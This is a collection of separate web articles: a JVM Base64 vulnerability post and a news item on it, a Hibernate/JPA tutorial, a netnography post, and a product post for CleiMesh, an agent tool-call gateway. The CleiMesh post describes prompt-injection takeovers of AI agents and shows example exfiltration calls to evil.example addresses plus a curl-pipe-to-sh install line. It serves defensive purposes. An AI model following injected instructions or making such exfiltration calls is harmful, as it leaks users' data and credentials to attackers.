It switches off the fast decoder, so heavy Base64 workloads may slow down. Test before rolling it out. One warning from Upwind that I want to repeat: a variant circulating online, -XX:DisableIntrinsic=_base64_decodeBlock, stops the JVM from starting on its own and becomes a fleet-wide outage when pushed through JAVA_TOOL_OPTIONS. Endor Labs lists it only together with -XX:+UnlockDiagnosticVMOptions. Skip it and use the flag above.

The bottom line

I have not reproduced this myself, and I would not trust any article that claims to have run Calif's chains without Calif's code. What the public record supports today is a real, remotely triggerable memory-safety bug in the runtime that carries a vendor fix and a one-line mitigation. Whether it becomes the next Log4Shell depends on whether Calif's promised product exploits arrive before your restart window closes.

Here is the question I would put to your team today: if someone asked you to list every JVM your company runs, including the ones inside vendor appliances, how long would that take?

GDS K S · thegdsks.com · building Glincker · follow on X @thegdsks

The scariest runtime bugs are the ones your dependency scanner cannot see.

Sources: Upwind, Endor Labs, Qualys, Equixly, Calif.

title: Stop the action, not the injection
description:
2026 has a pattern. A single email takes over a cloud agent and reaches its Gmail token (Salt Labs' "Manus" research). A single prompt to an AWS Bedrock AgentCore agent reaches the instance metadata service and pulls over-permissioned cloud credentials — and AWS called it "expected behavior" (Zenity, CVE-2026-18830). Microsoft 365 Copilot leaks data through indirect prompt injection again and again — Reprompt, ShareLeak, SearchLeak, CoSnitch — and in one reported case the data left even though the safety layer flagged the attack.

Different products, one failure: an agent acting with broad, inherited authority, and nothing enforcing the limit at the moment of the action. Google measured a 32% rise in malicious prompt injections in a single quarter; the Cloud Security Alliance says indirect injection has crossed from proof-of-concept to live exploitation; Anthropic says no browser agent is immune.

So stop trying to win the injection fight. You won't. The model will be fooled.

Win the next step instead. Look at what every one of those incidents actually needs to do damage: send the email, fetch the attacker's URL to exfiltrate, pay the wrong payee, invoke another agent with your credentials. The injection is the match; the tool call is the fuel. Put the control on the tool call — outside the agent, where a prompt can't reach it — and the injection buys nothing.

That is what CleiMesh does: a signed, delegable permission the gateway enforces on each tool call, with a receipt. Four things it stops — each a command you can run.

1. A spending cap the agent can't widen

Give an agent a signed allowance — one tool, one recipient, a total, a number of calls — and it acts on its own inside that, while a prompt-injected agent can't widen it, because the limit lives outside the agent, not in its prompt.

agent> pay demo $2.00       -> ok. spent $2.00 of $5.00.
agent> pay demo $2.00       -> ok. spent $4.00 of $5.00.
agent> pay demo $2.00       -> refused: over the $5.00 allowance.
agent> pay attacker $1.00   -> refused: payee not in the allowance.

# one line to install, then one command — no clone, no build:
curl -fsSL https://github.com/cleitonaugusto/cleimesh/releases/latest/download/install.sh | sh
cleimesh demo payments

2. The injected agent can't act — the Manus case

A tool that reads mail brings in outside content, so it taints the agent. Tools that act on the world are refused while the agent is tainted, until a human clears it. This is the control for the one-email takeover.

agent> send_email to team@acme.example        -> ok.
agent> read_inbox                             -> ok. (carries injected instructions)
agent> send_email to attacker@evil.example    -> refused: received untrusted content
agent> fetch_url evil.example/collect?data=.. -> refused: received untrusted content

cleimesh demo taint

3. An egress allowlist — the exfiltration case

The exfiltration step behind the Copilot flaws is a fetch to the attacker's domain. Constrain the agent's fetch tool to the hosts the human signed, and the attacker's URL — and the classic allowed-host@attacker disguise — are refused at the gateway, before the server runs.

agent> fetch_url https://api.acme.example/v1/data      -> ok.
agent> fetch_url https://evil.example/collect?data=..  -> REFUSED
agent> fetch_url https://api.acme.example@evil.example -> REFUSED

cleimesh demo egress

4. In front of a real server

None of this is a toy protocol. examples/wrap-google-workspace.sh puts CleiMesh in front of a popular Gmail MCP server: the read tools taint, the send and draft tools are clean-only. An agent that read a message can't send one until you clear it. Your Google login stays with you; CleiMesh only gates the calls.

5. And you can prove it — in a 640-byte proof

Enforcement stops the overspend. The receipt is what lets someone check, afterward, that it did. Every call — allowed or refused — lands in a signed, hash-chained receipt, and those receipts form a transparency log built on the same Merkle construction as Certificate Transparency and Sigstore. So a third party can verify that one receipt is in the signed log, and that the log only ever appended — with a 640-byte proof, in about 13 microseconds, in a log of a million receipts, without the other 999,999 and without trusting the agent or the gateway that wrote it.

cleimesh audit sth        # the signed head of the log
cleimesh audit prove 3    # a proof that receipt #3 is in it

That is the part none of the "budget for your agent" tools have: not just a limit, but a record a stranger can verify. The receipts reproduce the published test vectors of the IETF agent-action-receipts draft byte for byte — it's a format, not a silo. (Numbers and the vectors: BENCHMARKS.md.)

What this does not do

It does not fix the injection, the SSRF, or the rendering race — those live inside the model or the app. It covers the layer where the damage lands: the tool call that sends, fetches, pays, or delegates. If the harm never crosses a tool boundary CleiMesh mediates, CleiMesh doesn't see it. That honesty is the point: we don't claim to make agents un-foolable. We make being fooled cost nothing.

Install it, run cleimesh demo all, and watch each attack get refused in about ten seconds. Then put it in front of your own agent's riskiest tool.

CleiMesh is alpha and open source (MIT / Apache-2.0). It is the enforcement layer, not a promise that your model is safe. Code and demos: github.com/cleitonaugusto/cleimesh

title: Security flaw in OpenJDK allows remote code execution
description:
A critical vulnerability dubbed Java4Shell (CVE-2026-114938) impacts OpenJDK's Base64 decoder on x86-64 processors with AVX-512 VBMI support.

The flaw allows unauthenticated remote code execution, memory exposure, or JVM crashes in default configurations of major Java platforms.

Oracle released patches on November 17, 2026.

Oracle released security patches on November 17, 2026, while the US Cybersecurity and Infrastructure Administration urged organizations to update their systems immediately. The problem is not in the application libraries, but directly in the Java runtime environment, which means administrators need to check which version each service is using.

Which systems are affected?

According to the researchers who discovered the bug, the issue affects some computers with specific processors, while systems with ARM64 architecture are not affected. During testing, it was found that in default settings of well-known applications and tools, such as Keycloak, Atlassian Jira, Confluence, JFrog Artifactory, Jenkins and PingFederate, it was possible to execute commands without a connection.

Other services, such as Apache Kafka Broker, Apache Solr, Elasticsearch, Gerrit, and Spinnaker, required a prior login to be affected. Additionally, a demonstration showed that there was also a risk via client login, after opening an encrypted connection to an unknown computer.

↳

READ ALSO

HACKS.GR / RELATED

Vulnerabilities & Security Updates

Bart Blaze: Research reveals attack with fake Crypto Wallets and ScreenConnect

↗

In addition to code execution, the bug can cause an unexpected system shutdown or leak sensitive data located in the application's memory.

How can you protect yourself?

To address the issue, organizations are urged to install the latest updates made available by Oracle, such as 17.0.21.1, 21.0.13.1, 25.0.5.1, and 27.0.1.1, as well as updates for Java 8 Enterprise Performance Pack and GraalVM.

In cases where immediate updating is not possible, experts recommend temporary settings to disable the problematic function when starting Java, restrict access to those who are not logged in, as well as stricter control of the data received by applications.

title: Hibernate From Scratch: Understanding JPA, Entities, Repositories & Spring Boot
description:
• A beginner-friendly guide to understanding how Java applications communicate with databases using Hibernate and Spring Data JPA.

Introduction

When building a backend application, one of the most important responsibilities is managing data. Applications need to store information, retrieve records, update existing data, and delete records when necessary.

Traditionally, developers used SQL queries and JDBC (Java Database Connectivity) to communicate directly with relational databases.

Although JDBC provides powerful database access, writing SQL queries and manually mapping database records to Java objects can become repetitive, especially in large applications.

This is where JPA, Hibernate, and Spring Data JPA come into play.

These technologies simplify database operations by allowing developers to work with Java objects instead of writing SQL queries for every database operation.

In this article, we'll explore these concepts from scratch and understand how they work together in a Spring Boot application.

1. Understanding the Fundamentals

Before writing code, let's understand three important concepts.

What is ORM?

ORM stands for Object-Relational Mapping.

It is a technique that maps Java objects to relational database tables.

For example, imagine an application that manages users.

In Java, we might represent a user using a class:

public class User {
    private Long id;
    private String name;
    private String email;
}

In a relational database, the same information might be stored in a table:

users

id name email
1 John john@example.com
2 Sarah sarah@example.com

ORM allows us to connect these two representations.

Instead of manually converting database rows into Java objects, an ORM framework handles much of that work.

What is JPA?

JPA stands for Java Persistence API, now officially known as Jakarta Persistence.

JPA is a specification that defines how Java applications should manage relational data.

It provides standard annotations and interfaces for:

  • Mapping Java classes to database tables.
  • Mapping object properties to database columns.
  • Managing entity relationships.
  • Persisting and retrieving data.
  • Managing entity lifecycle operations.

An important thing to understand is that JPA is not an implementation. It defines the rules and standards that persistence providers must follow.

What is Hibernate?

Hibernate is an ORM framework and one of the most widely used implementations of the JPA specification.

It provides the actual functionality behind many JPA operations.

For example, when we use:

userRepository.save(user);

Hibernate can generate the appropriate SQL statement and execute it against the database.

Hibernate handles tasks such as:

  • Generating SQL queries.
  • Mapping database records to Java objects.
  • Managing entity states.
  • Tracking changes to entities.
  • Handling database relationships.
  • Managing persistence contexts.

In simple terms:

  • JPA defines the standard.
  • Hibernate implements the standard.
  • Spring Data JPA simplifies database access through repository abstractions.

2. How Spring Boot, JPA, Hibernate, and Spring Data JPA Work Together

These technologies are often used together in Spring Boot applications.

Let's understand their relationship.

        Spring Boot Application
                 |
                 v
          Spring Data JPA
                 |
                 v
              JPA API
                 |
                 v
             Hibernate
                 |
                 v
           JDBC Driver
                 |
                 v
          Relational Database
          (PostgreSQL / MySQL)

Each layer has a specific responsibility.

Spring Boot

Provides application configuration and integrates the persistence technologies.

Spring Data JPA

Provides repository interfaces and reduces the amount of database-access code developers need to write.

JPA

Defines the persistence standards and annotations.

Hibernate

Implements JPA and performs the actual ORM operations.

JDBC Driver

Allows Java applications to communicate with the database.

Database

Stores the actual application data.

Understanding this architecture makes it easier to identify which technology is responsible for each operation.

3. Setting Up a Spring Boot Project

Let's create a simple Spring Boot application that uses Hibernate and PostgreSQL.

When creating a project using Spring Initializr, include these dependencies:

  • Spring Web
  • Spring Data JPA
  • PostgreSQL Driver
  • Validation

Spring Boot automatically configures Hibernate as the default JPA provider when the JPA starter is included, unless another provider is configured.

A simplified project structure might look like this:

src/main/java/com/example/demo/
│
├── controller/
│   └── UserController.java
│
├── service/
│   └── UserService.java
│
├── repository/
│   └── UserRepository.java
│
├── entity/
│   └── User.java
│
└── DemoApplication.java

Each package has a specific responsibility:

  • entity: Defines database-mapped Java objects.
  • repository: Handles database access.
  • service: Contains business logic.
  • controller: Handles HTTP requests and responses.

This separation makes applications easier to maintain and extend.

4. Understanding Entities in JPA

An entity is a Java class that represents a database table.

Hibernate uses entity metadata to understand how Java objects should be mapped to database records.

Let's create a User entity.

package com.example.demo.entity;

import jakarta.persistence.*;
import java.time.LocalDateTime;

@Entity
@Table(name = "users")
public class User {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, length = 100)
    private String name;

    @Column(nullable = false, unique = true)
    private String email;

    @Column(name = "created_at")
    private LocalDateTime createdAt;

    public User() {
    }

    // Getters and setters
}

Let's understand the important annotations.

@entity

Marks a Java class as a JPA entity.

Hibernate recognizes this class as something that should be persisted in the database.

@Table

Specifies the database table associated with the entity.

@Table(name = "users")

Without this annotation, JPA derives the table name from the entity name.

@id

Defines the primary key of the entity.

Every entity must have an identifier.

@GeneratedValue

Specifies how the primary key should be generated.

For example:

@GeneratedValue(strategy = GenerationType.IDENTITY)

Common generation strategies include:

  • IDENTITY: Relies on database-generated identity values.
  • SEQUENCE: Uses a database sequence.
  • TABLE: Uses a separate database table to generate identifiers.
  • AUTO: Allows the persistence provider to choose an appropriate strategy.

The best choice depends on the database and application requirements.

@column

Customizes how a Java field maps to a database column.

For example:

@Column(nullable = false, unique = true)
private String email;

This indicates that the column should not accept null values and should contain unique values.

Important: JPA annotations describe mapping and schema-generation metadata. They do not replace proper database constraints and migrations in production applications.

5. Understanding Entity Relationships

Real-world applications rarely contain independent tables.

For example, an e-commerce application might have:

  • Users
  • Orders
  • Products
  • Payments

These tables need relationships to represent how data is connected.

JPA provides four primary relationship annotations.

@OneToOne

Represents a relationship where one record is associated with one other record.

Example: One user has one profile.

@OneToOne
@JoinColumn(name = "profile_id")
private Profile profile;

@OneToMany

Represents a relationship where one record can be associated with multiple records.

Example: One user can have multiple orders.

@OneToMany(mappedBy = "user")
private List<Order> orders;

@ManyToOne

Represents multiple records associated with one record.

Example: Multiple orders can belong to one user.

@ManyToOne(fetch = FetchType.LAZY)
@JoinColumn(name = "user_id")
private User user;

@ManyToMany

Represents a relationship where multiple records can be associated with multiple other records.

Example: Students can enroll in multiple courses, and each course can have multiple students.

@ManyToMany
@JoinTable(
    name = "student_courses",
    joinColumns = @JoinColumn(name = "student_id"),
    inverseJoinColumns = @JoinColumn(name = "course_id")
)
private Set<Course> courses;

Understanding relationships is essential when designing a relational database using JPA.

6. What Are Repositories in Spring Data JPA?

After defining entities, we need a way to perform database operations.

This is where Spring Data JPA repositories become useful.

A repository is an abstraction that provides methods for interacting with the database.

Instead of manually writing SQL queries for basic operations, we can extend an existing Spring Data interface.

Let's create a UserRepository.

package com.example.demo.repository;

import com.example.demo.entity.User;
import org.springframework.data.jpa.repository.JpaRepository;

public interface UserRepository
        extends JpaRepository<User, Long> {

}

That's it!

We haven't written any implementation code.

Spring Data JPA automatically provides the implementation at runtime.

By extending JpaRepository, we get access to several useful methods.

Method Purpose
save() Insert or update an entity
findById() Find an entity by its ID
findAll() Retrieve all entities
existsById() Check whether an entity exists
deleteById() Delete an entity by ID
count() Count available records

For example:

userRepository.findAll();

Retrieves all users.

userRepository.findById(1L);

Retrieves a user with ID 1.

userRepository.deleteById(1L);

Deletes the user with ID 1.

Spring Data JPA generates the required database-access implementation behind these methods.

Custom Query Methods

One of the most useful features of Spring Data JPA is query method derivation.

We can define methods based on the properties of an entity.

For example:

public interface UserRepository
        extends JpaRepository<User, Long> {

    Optional<User> findByEmail(String email);

    List<User> findByName(String name);

    boolean existsByEmail(String email);
}

Spring Data JPA analyzes these method names and generates the corresponding queries.

We can also write custom JPQL queries using @Query.

@Query("SELECT u FROM User u WHERE u.email = :email")
Optional<User> findUserByEmail(
    @Param("email") String email
);

JPQL operates on entity classes and their properties rather than directly referencing database table and column names.

7. Understanding the Service Layer

In a properly structured Spring Boot application, controllers should not directly contain database operations.

Instead, we introduce a service layer to manage business logic.

Let's create a UserService.

package com.example.demo.service;

import com.example.demo.entity.User;
import com.example.demo.repository.UserRepository;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class UserService {

    private final UserRepository userRepository;

    public UserService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    public User createUser(User user) {
        return userRepository.save(user);
    }

    public List<User> getAllUsers() {
        return userRepository.findAll();
    }
}

Why use a service layer?

The service layer provides a place to implement:

  • Business rules.
  • Validation beyond basic input constraints.
  • Transaction management.
  • Coordination between multiple repositories.
  • Application-specific logic.

For example, before creating a user, we might check whether the email address is already registered.

This keeps the controller focused on handling HTTP requests rather than implementing business rules.

8. Connecting the Application to PostgreSQL

Now we need to configure the database connection.

In Spring Boot, database configuration is commonly defined in:

application.yml

spring:
  datasource:
    url: jdbc:postgresql://localhost:5432/demo_db
    username: postgres
    password: your_password
    driver-class-name: org.postgresql.Driver

  jpa:
    hibernate:
      ddl-auto: validate
    show-sql: true
    properties:
      hibernate:
        format_sql: true

Let's understand the configuration.

datasource.url

Specifies the database connection URL.

username and password

Provide database authentication credentials.

ddl-auto

Controls Hibernate's automatic database schema handling.

Common options include:

Value Description
create Creates the schema and may drop existing tables
create-drop Creates the schema and drops it when the session factory closes
update Attempts to update the schema
validate Checks whether the schema matches the entity mappings
none Disables automatic schema management

For production applications, using validate or none alongside a database migration tool such as Flyway or Liquibase is generally a safer approach.

Avoid relying on ddl-auto=update as your production database migration strategy.

9. Understanding the Entity Lifecycle

One of the most important Hibernate concepts is the entity lifecycle.

Hibernate manages entities through different states.

There are four commonly discussed states:

1. Transient

An object is transient when it has been created but is not associated with a persistence context.

User user = new User();
user.setName("John");
user.setEmail("john@example.com");

At this point, the object exists only in application memory.

2. Managed (Persistent)

An entity becomes managed when it is associated with an active persistence context.

For example:

entityManager.persist(user);

Hibernate starts tracking the entity.

Changes made to a managed entity can automatically be synchronized with the database.

3. Detached

An entity becomes detached when it is no longer associated with its persistence context.

For example, after the persistence context is closed, previously managed entities become detached.

Changes to detached objects are not automatically synchronized with the database.

4. Removed

An entity enters the removed state when it is scheduled for deletion.

entityManager.remove(user);

The actual database deletion happens when the persistence context is flushed.

Understanding these states helps explain why Hibernate sometimes executes SQL statements even when we haven't explicitly called a save method.

10. What Is a Persistence Context?

A persistence context is an important part of JPA and Hibernate.

Think of it as an environment that manages entity instances during their lifecycle.

It maintains a collection of managed entities and tracks changes made to them.

For example:

@Transactional
public void updateUser(Long id) {

    User user = userRepository.findById(id)
        .orElseThrow();

    user.setName("Updated Name");
}

Notice something interesting.

We didn't call:

userRepository.save(user);

Yet the updated name can still be persisted.

Why?

Because the entity is managed by the persistence context.

Hibernate detects the changes and synchronizes them with the database during transaction flushing. This mechanism is called dirty checking.

This is one of Hibernate's most powerful features.

11. Understanding Transactions in Spring Boot

A database transaction is a group of operations treated as one logical unit.

Transactions help maintain data consistency.

Spring provides the @Transactional annotation to manage transactions.

Example:

@Transactional
public void transferMoney(
        Long fromAccountId,
        Long toAccountId,
        BigDecimal amount) {

    Account from = accountRepository
        .findById(fromAccountId)
        .orElseThrow();

    Account to = accountRepository
        .findById(toAccountId)
        .orElseThrow();

    from.setBalance(from.getBalance().subtract(amount));

    to.setBalance(to.getBalance().add(amount));
}

Both updates should succeed together.

If an applicable unchecked exception occurs, Spring normally rolls back the transaction.

This prevents a situation where money is deducted from one account but not added to the other.

Transactions are particularly important when multiple database operations depend on each other.

12. Understanding Lazy and Eager Loading

When working with entity relationships, Hibernate needs to determine when related data should be retrieved.

JPA provides two common fetching strategies.

Lazy Loading

Related data is retrieved only when it is accessed.

@OneToMany(
    mappedBy = "user",
    fetch = FetchType.LAZY
)
private List<Order> orders;

Eager Loading

Related data is retrieved eagerly as part of loading the entity, although the exact SQL strategy is provider-dependent.

@ManyToOne(fetch = FetchType.EAGER)
private User user;

Lazy loading is generally a good default for collections because it avoids unnecessarily loading large amounts of data.

However, it can introduce the N+1 query problem.

For example, retrieving 100 orders and then accessing each order's user might result in one query to retrieve the orders and additional queries to retrieve users.

Possible solutions include:

  • JPQL JOIN FETCH.
  • Entity graphs.
  • DTO projections.
  • Batch fetching.

Understanding fetching strategies is important for building efficient applications.

13. Putting Everything Together: A Simple REST API

Now let's connect everything.

We'll create a REST controller that exposes user-related endpoints.

package com.example.demo.controller;

import com.example.demo.entity.User;
import com.example.demo.service.UserService;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@RequestMapping("/api/users")
public class UserController {

    private final UserService userService;

    public UserController(UserService userService) {
        this.userService = userService;
    }

    @PostMapping
    public User createUser(@RequestBody User user) {
        return userService.createUser(user);
    }

    @GetMapping
    public List<User> getAllUsers() {
        return userService.getAllUsers();
    }
}

We now have two basic endpoints.

HTTP Method Endpoint Description
POST /api/users Create a user
GET /api/users Retrieve all users

The complete request flow looks like this:

       Client Request
             |
             v
       UserController
             |
             v
        UserService
             |
             v
       UserRepository
             |
             v
          Hibernate
             |
             v
         PostgreSQL

When a client sends a request to create a user:

  1. The controller receives the HTTP request.
  2. The service handles the application logic.
  3. The repository executes the persistence operation.
  4. Hibernate translates the operation into SQL.
  5. The JDBC driver communicates with PostgreSQL.
  6. The database stores the record.
  7. The result is returned through the application layers.

This is the basic architecture behind many Spring Boot applications.

Note: This example demonstrates the persistence flow. A production API should use request/response DTOs, validation, exception handling, and appropriate transaction boundaries rather than exposing JPA entities directly.

14. Common Mistakes Beginners Should Avoid

When starting with Hibernate and Spring Data JPA, there are several common mistakes worth understanding.

1. Confusing JPA with Hibernate

JPA is a specification, while Hibernate is an implementation. They are related but not interchangeable concepts.

2. Using entities directly in REST APIs

Returning entities directly can expose internal database structures and create serialization problems, particularly with bidirectional relationships.

Use DTOs instead.

3. Ignoring entity relationships

Incorrect relationship mappings can cause duplicate records, unexpected SQL queries, or data consistency problems.

4. Using EAGER fetching everywhere

Eager loading can retrieve unnecessary data and negatively affect application performance.

5. Ignoring transactions

Operations involving multiple database changes should have appropriate transaction boundaries.

6. Depending on Hibernate to manage production schemas

Use database migration tools such as Flyway or Liquibase to manage schema changes in a controlled and versioned manner.

Conclusion

Understanding Hibernate, JPA, and Spring Data JPA is an important step toward becoming a capable Spring Boot backend developer.

The key concepts to remember are:

  • ORM connects Java objects with relational database tables.
  • JPA defines the persistence specification.
  • Hibernate implements the JPA specification.
  • Spring Data JPA simplifies database access through repositories.
  • Entities represent database records.
  • Repositories provide database operations.
  • Services manage business logic.
  • Persistence contexts track managed entities.
  • Transactions help maintain data consistency.
  • Fetching strategies influence database performance.

Rather than memorizing annotations and methods, focus on understanding what happens behind the scenes when an application communicates with a database.

Once you understand how these components work together, building more complex backend systems becomes much easier.

The best way to learn Hibernate is to build something with it. Start with a simple CRUD application, introduce entity relationships, implement transactions, and gradually explore more advanced persistence concepts.

Happy coding! 🚀

title: I used to read TV audiences live. Now I read app reviews the same way.
description:
In 2013 I worked as an applied anthropologist at a market research firm in Mexico City. One of my jobs: when a TV network premiered a telenovela, I watched the audience, not the show.

While each episode aired, I followed what people wrote on social media in real time. How they felt about the characters and the story, and how that changed from scene to scene. The network learned how people felt while it was still happening, not weeks later in a survey.

That method has a name: netnography, ethnography of online communities. Thirteen years later, now as a frontend engineer, I used it again for a UX case study on a Mexican mobile carrier. No TV this time: 55 public comments from app stores and a Facebook community.

It turned out to be the most useful research I did in the whole project. And any developer can do it this Friday afternoon.

Why it works

Surveys ask people questions. Reviews and community posts are people talking without anyone asking. Nobody writes a one-star review to be polite. They write it at the exact moment something failed, in their own words, often with details you'd never think to ask about.

That's what I learned in focus groups too: what people say when you ask them is not always what they do. Unprompted conversation gets closer to what they actually do.

How to do it, step by step

1. Pick where people already talk. App Store and Google Play reviews, public Facebook groups, Reddit, your own support tickets. Start with public reviews: they're the easiest and raise the fewest ethical questions.

2. Collect 50 to 100 recent comments. Six months back is enough. Copy them into a spreadsheet, one per row.

3. Paraphrase, don't copy. Write what each person says in your own words, without names. That protects them, and it forces you to understand the comment before you classify it.

4. Code each comment by theme. Start with no categories; let them appear as you read. After 15 or 20 comments, patterns show up. In my case: "the app hides the basics", "I paid but it doesn't work", "support never answers", "I don't trust this".

5. Count. Counting turns impressions into evidence. "Users struggle with login" is an opinion. "In 6 of 55 comments, the registration banner hid the login button" is a finding a product manager can act on.

6. Stop at saturation. When new comments stop producing new themes, you have enough. For me that happened around comment 45.

7. Go see it yourself. Every theme is a hypothesis. Open the app and try to reproduce it. When I did, the registration banner was there, asking me to register a line I had already registered.

What I found

Here's what 55 comments looked like once coded:

Theme Comments
The app hides the basics (balance, usage, login) 12
Paid or completed, but not working 8
Support: slow, bots, no human 7
Trust and security 5
Unclear plan conditions 5

The biggest theme wasn't a bug. It was information hierarchy: promotions came first, and what people opened the app to do came second. No crash report would ever show you that.

The limits (say them out loud)

  • Reviews skew negative. Happy people rarely write. Netnography shows you where it hurts, not how many people hurt.
  • It's not a replacement for talking to users. It tells you what to ask them.
  • Private groups need permission. If a community is closed, ask the admins or stay with public sources.
  • Never publish anything that identifies someone: no names, no screenshots with faces, no exact quotes that can be searched back to a person.

The real lesson

In 2013 I read audiences so a TV network could adjust a story. In 2026 I read reviews to figure out why people couldn't find their balance. The method didn't change. What changed is that now I can also fix what I find.

That's the case I'd make to any developer: you don't need a research team to start listening. You need a spreadsheet, an afternoon, and the discipline to count before you conclude.

You can read the full case study, with the redesign and prototypes, on my site: Activated doesn't mean working.
